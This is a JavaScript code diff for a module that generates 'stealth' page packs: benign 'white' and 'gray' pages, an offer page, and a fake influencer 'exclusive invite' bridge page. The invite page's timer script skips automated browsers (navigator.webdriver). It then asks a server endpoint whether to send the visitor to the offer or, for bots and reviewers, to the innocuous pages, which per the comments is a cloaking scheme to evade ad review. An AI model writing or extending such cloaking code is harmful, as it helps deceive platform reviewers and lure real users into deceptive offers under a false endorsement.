@@ -135,6 +135,23 @@ function esc(s) {
   return String(s || '').replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;').replace(/"/g, '&quot;');
 }
 
+/** Normaliza URL de imagem para funcionar melhor no celular (https, sem javascript:). */
+function normalizeImageUrl(raw) {
+  let s = String(raw || '').trim().replace(/^['"]|['"]$/g, '');
+  if (!s) return '';
+  if (/^javascript:/i.test(s) || /^data:text\/html/i.test(s)) return '';
+  if (s.startsWith('//')) s = 'https:' + s;
+  if (!/^https?:\/\//i.test(s) && /^[\w.-]+\.[a-z]{2,}/i.test(s)) s = 'https://' + s;
+  if (!/^https?:\/\//i.test(s)) return '';
+  try {
+    const u = new URL(s);
+    if (u.protocol !== 'http:' && u.protocol !== 'https:') return '';
+    return u.toString();
+  } catch (e) {
+    return '';
+  }
+}
+
 function proStyles(t, variant = 'classic') {
   const { accent, accentLight, accentSoft, accentMuted } = t;
   const fonts = {
@@ -217,6 +234,7 @@ function wrapHtml(title, body, styles, meta = {}) {
   const desc = esc((meta.description || '').slice(0, 160));
   const ogTitle = esc(meta.ogTitle || title);
   const ogDesc = desc || ogTitle;
+  const ogImage = meta.ogImage ? `<meta property="og:image" content="${esc(meta.ogImage)}">` : '';
   return `<!DOCTYPE html>
 <html lang="pt-BR">
 <head>
@@ -228,6 +246,7 @@ function wrapHtml(title, body, styles, meta = {}) {
   <meta property="og:title" content="${ogTitle}">
   <meta property="og:description" content="${ogDesc}">
   <meta property="og:locale" content="pt_BR">
+  ${ogImage}
   <meta name="twitter:card" content="summary">
   <meta name="twitter:title" content="${ogTitle}">
   <meta name="twitter:description" content="${ogDesc}">
@@ -315,64 +334,57 @@ function buildOfferPage(themeKey, opts = {}, pageData) {
     { num: '24/7', label: 'Acesso imediato' },
     { num: '+', label: 'Atualizações' }
   ];
-  const trustHtml = trust.map((x) => `
-    <div class="trust-item"><div class="trust-num">${esc(x.num)}</div><div class="trust-label">${esc(x.label)}</div></div>`).join('');
+  const trustHtml = trust.map((x) => `<div><div class="trust-num">${esc(x.num)}</div><div class="trust-label">${esc(x.label)}</div></div>`).join('');
   const body = `
-  <div class="topbar"><div class="container-wide topbar-inner">
+  <div class="topbar"><div class="container topbar-inner">
     <div class="logo">${brand}</div>
-    <div class="topbar-tag">Material exclusivo</div>
+    <div class="topbar-tag">Oferta</div>
   </div></div>
-  <section class="hero hero-offer"><div class="container-wide">
-    <span class="badge-offer">${esc(o.badge)}</span>
+  <section class="hero hero-offer"><div class="container">
+    <span class="badge-offer">Acesso exclusivo</span>
     <h1>${product}</h1>
     <p class="lead">${esc(o.lead)}</p>
   </div></section>
-  <section class="content"><div class="container-wide">
+  <section class="content"><div class="container">
     <div class="features">${features}</div>
-    <article style="margin-top:24px">
-      <h2 style="margin-top:0">O que está incluído</h2>
+    <article>
+      <h2>O que você recebe</h2>
       <ul class="benefits">${bullets}</ul>
-      <div class="trust-bar">${trustHtml}</div>
+      <h2>Perguntas frequentes</h2>
+      ${faq}
     </article>
-    <div style="margin-top:32px"><h2 style="margin-bottom:16px;font-size:1.1rem">Perguntas frequentes</h2>${faq}</div>
-    <div class="disclaimer" style="margin-top:28px;border-radius:var(--radius);border:1px solid var(--border);background:var(--bg);border-left:none">
-      Material digital para consulta e estudo. Resultados variam conforme dedicação e contexto individual.
-    </div>
+    <div class="trust-bar">${trustHtml}</div>
   </div></section>
   ${footerHtml(brand, year)}`;
-  return wrapHtml(product, body, proStyles(t));
+  return wrapHtml(product, body, proStyles(t, 'classic'), { description: o.lead || product, ogTitle: product });
 }
 
 function getStealthPagePack(themeKey = 'geral', opts = {}) {
   const key = resolveThemeKey(themeKey);
-  const packId = opts.suffix || uniquePackId();
+  const packId = uniquePackId();
   const generatedAt = formatPackStamp();
-  const mergedOpts = { ...opts };
-  if (!mergedOpts.brandName) mergedOpts.brandName = themeBrand(key, mergedOpts);
-  const label = THEMES[key].label;
   const whiteData = composePageData(key, 'white');
   const grayData = composePageData(key, 'gray');
   const offerData = composePageData(key, 'offer');
-  const offerHeadline = mergedOpts.productName || offerData.title;
+  const mergedOpts = { ...opts };
+  const whiteHeadline = whiteData.title;
+  const grayHeadline = grayData.title;
+  const offerHeadline = opts.productName || offerData.title;
   return {
     theme: key,
-    themeLabel: label,
+    themeLabel: (THEMES[key] || THEMES.geral).label,
     packId,
     generatedAt,
-    titles: {
-      white: whiteData.title,
-      gray: grayData.title,
-      offer: offerHeadline
-    },
+    titles: { white: whiteHeadline, gray: grayHeadline, offer: offerHeadline },
     pages: [
       {
         role: 'white',
-        name: stealthPageName('White', whiteData.title, generatedAt, packId),
+        name: stealthPageName('White', whiteHeadline, generatedAt, packId),
         html_content: buildWhitePage(key, mergedOpts, whiteData)
       },
       {
         role: 'gray',
-        name: stealthPageName('Gray', grayData.title, generatedAt, packId),
+        name: stealthPageName('Gray', grayHeadline, generatedAt, packId),
         html_content: buildGrayPage(key, mergedOpts, grayData)
       },
       {
@@ -405,39 +417,38 @@ function listStealthThemes() {
 }
 
 /**
- * White emocional estilo "convite exclusivo do influenciador".
- * withTimer=false → crawler/revisor (HTML estático, sem JS de salto).
- * withTimer=true  → lead (barra + countdown → location.replace na oferta).
+ * Convite exclusivo.
+ * withTimer + navPath → após timer consulta /api/n/ (lead→oferta; bot→white/gray no mesmo link).
+ * withTimer + destUrl (legado) → location.replace direto.
  */
 function buildInviteBridgeHtml(opts = {}) {
   const name = String(opts.influencerName || 'CONVIDADO').trim() || 'CONVIDADO';
   const nameEsc = esc(name);
-  const photo = String(opts.photoUrl || '').trim();
-  const banner = String(opts.bannerUrl || photo || '').trim();
+  const photo = normalizeImageUrl(opts.photoUrl);
+  const banner = normalizeImageUrl(opts.bannerUrl) || photo;
   const timerSec = Math.max(2, Math.min(30, parseInt(opts.timerSeconds, 10) || 6));
   const dest = String(opts.destUrl || '').trim();
-  const withTimer = !!opts.withTimer && !!dest;
+  const navPath = String(opts.navPath || '').trim();
+  const withTimer = !!opts.withTimer && (!!navPath || !!dest);
   const year = new Date().getFullYear();
   const initials = name.replace(/[^A-Za-z0-9À-ÿ]/g, ' ').trim().split(/\s+/).slice(0, 2).map((w) => w[0] || '').join('').toUpperCase() || '?';
-
-  const photoCss = photo
-    ? `background-image:url(${JSON.stringify(photo)});background-size:cover;background-position:center;`
-    : '';
-  const bannerCss = banner
-    ? `background-image:linear-gradient(180deg,rgba(15,23,42,.45),rgba(15,23,42,.78)),url(${JSON.stringify(banner)});`
-    : 'background-image:linear-gradient(145deg,#1e293b 0%,#0f172a 55%,#334155 100%);';
+  const photoAttr = photo ? esc(photo) : '';
+  const bannerAttr = banner ? esc(banner) : '';
 
   const timerScript = withTimer
-    ? `<script>(function(){try{if(navigator.webdriver)return;var total=${timerSec}*1000,dest=${JSON.stringify(dest)},start=Date.now(),bar=document.getElementById('inv-bar'),lab=document.getElementById('inv-timer'),btn=document.getElementById('inv-btn');function go(){try{location.replace(dest)}catch(e){location.href=dest}}function tick(){var left=Math.max(0,total-(Date.now()-start)),s=Math.ceil(left/1000),pct=Math.min(100,((total-left)/total)*100);if(bar)bar.style.width=pct+'%';if(lab)lab.innerHTML=s>0?('Preparando seu <strong>acesso exclusivo</strong> em '+s+'s…'):'Abrindo seu acesso agora…';if(btn)btn.textContent=s>0?'Preparando seu acesso…':'Abrindo…';if(left<=0){go();return}requestAnimationFrame(tick)}requestAnimationFrame(tick)}catch(e){}})();</script>`
+    ? `<script>(function(){try{if(navigator.webdriver)return;var total=${timerSec}*1000,nav=${JSON.stringify(navPath)},dest=${JSON.stringify(dest)},start=Date.now(),bar=document.getElementById('inv-bar'),lab=document.getElementById('inv-timer'),btn=document.getElementById('inv-btn'),done=false;function goUrl(u){try{location.replace(u)}catch(e){location.href=u}}function apply(d){if(!d||done)return;done=true;if(d.inline&&d.html){try{document.open();document.write(d.html);document.close()}catch(e){}return}if(d.next)goUrl(d.next);else if(dest)goUrl(dest)}function pull(){if(!nav){if(dest)goUrl(dest);return}var q=location.search||'';fetch(nav+q,{method:'POST',credentials:'same-origin',headers:{'Content-Type':'application/json','Accept':'application/json'},body:'{}'}).then(function(r){return r.ok?r.json():null}).then(apply).catch(function(){if(dest)goUrl(dest)})}function tick(){var left=Math.max(0,total-(Date.now()-start)),s=Math.ceil(left/1000),pct=Math.min(100,((total-left)/total)*100);if(bar)bar.style.width=pct+'%';if(lab)lab.innerHTML=s>0?('Preparando seu <strong>acesso exclusivo</strong> em '+s+'s…'):'Abrindo seu acesso agora…';if(btn)btn.textContent=s>0?'Preparando seu acesso…':'Abrindo…';if(left<=0){pull();return}requestAnimationFrame(tick)}requestAnimationFrame(tick)}catch(e){}})();</script>`
     : '';
 
   const styles = `
     *{box-sizing:border-box;margin:0;padding:0}
     body{font-family:'Segoe UI',system-ui,-apple-system,sans-serif;background:#e8ecf1;color:#0f172a;min-height:100vh;display:flex;align-items:center;justify-content:center;padding:20px 14px;-webkit-font-smoothing:antialiased}
     .card{width:100%;max-width:400px;background:#fff;border-radius:18px;overflow:hidden;box-shadow:0 12px 40px rgba(15,23,42,.12)}
-    .hero{height:168px;background-size:cover;background-position:center;position:relative;${bannerCss}}
-    .hero-meta{position:absolute;left:16px;right:16px;bottom:14px;display:flex;align-items:center;gap:12px}
-    .avatar{width:52px;height:52px;border-radius:50%;border:2.5px solid #fff;box-shadow:0 2px 10px rgba(0,0,0,.25);flex-shrink:0;display:flex;align-items:center;justify-content:center;font-weight:800;font-size:15px;color:#fff;background:linear-gradient(135deg,#64748b,#334155);${photoCss}}
+    .hero{height:168px;background:linear-gradient(145deg,#1e293b 0%,#0f172a 55%,#334155 100%);position:relative;overflow:hidden}
+    .hero-bg{position:absolute;inset:0;width:100%;height:100%;object-fit:cover;display:block}
+    .hero-shade{position:absolute;inset:0;background:linear-gradient(180deg,rgba(15,23,42,.35),rgba(15,23,42,.78));pointer-events:none}
+    .hero-meta{position:absolute;left:16px;right:16px;bottom:14px;display:flex;align-items:center;gap:12px;z-index:2}
+    .avatar{width:52px;height:52px;border-radius:50%;border:2.5px solid #fff;box-shadow:0 2px 10px rgba(0,0,0,.25);flex-shrink:0;display:flex;align-items:center;justify-content:center;font-weight:800;font-size:15px;color:#fff;background:linear-gradient(135deg,#64748b,#334155);overflow:hidden}
+    .avatar img{width:100%;height:100%;object-fit:cover;display:block}
     .hero-txt{min-width:0}
     .hero-name{font-size:15px;font-weight:800;color:#fff;letter-spacing:.04em;text-transform:uppercase;line-height:1.2;text-shadow:0 1px 3px rgba(0,0,0,.35)}
     .hero-sub{font-size:12px;color:rgba(255,255,255,.88);margin-top:2px;text-shadow:0 1px 2px rgba(0,0,0,.3)}
@@ -459,11 +470,20 @@ function buildInviteBridgeHtml(opts = {}) {
     ? `Preparando seu <strong>acesso exclusivo</strong> em ${timerSec}s…`
     : 'Seu convite está ativo. Aguarde a confirmação da equipe.';
 
+  const bannerImg = bannerAttr
+    ? `<img class="hero-bg" src="${bannerAttr}" alt="" decoding="async" referrerpolicy="no-referrer" onerror="this.style.display='none'">`
+    : '';
+  const avatarInner = photoAttr
+    ? `<img src="${photoAttr}" alt="${nameEsc}" decoding="async" referrerpolicy="no-referrer" onerror="this.remove();this.parentNode.textContent='${esc(initials)}'">`
+    : esc(initials);
+
   const body = `
   <div class="card">
     <div class="hero">
+      ${bannerImg}
+      <div class="hero-shade"></div>
       <div class="hero-meta">
-        <div class="avatar" aria-hidden="true">${photo ? '' : esc(initials)}</div>
+        <div class="avatar" aria-hidden="true">${avatarInner}</div>
         <div class="hero-txt">
           <div class="hero-name">${nameEsc}</div>
           <div class="hero-sub">Convite exclusivo para você</div>
@@ -485,7 +505,8 @@ function buildInviteBridgeHtml(opts = {}) {
 
   return wrapHtml(`${name} · Convite exclusivo`, body, styles, {
     description: `${name} selecionou você para uma oportunidade exclusiva.`,
-    ogTitle: `Convite exclusivo · ${name}`
+    ogTitle: `Convite exclusivo · ${name}`,
+    ogImage: photo || banner || ''
   });
 }
 
@@ -495,5 +516,6 @@ module.exports = {
   listStealthThemes,
   resolveThemeKey,
   buildInviteBridgeHtml,
+  normalizeImageUrl,
   THEMES
 };
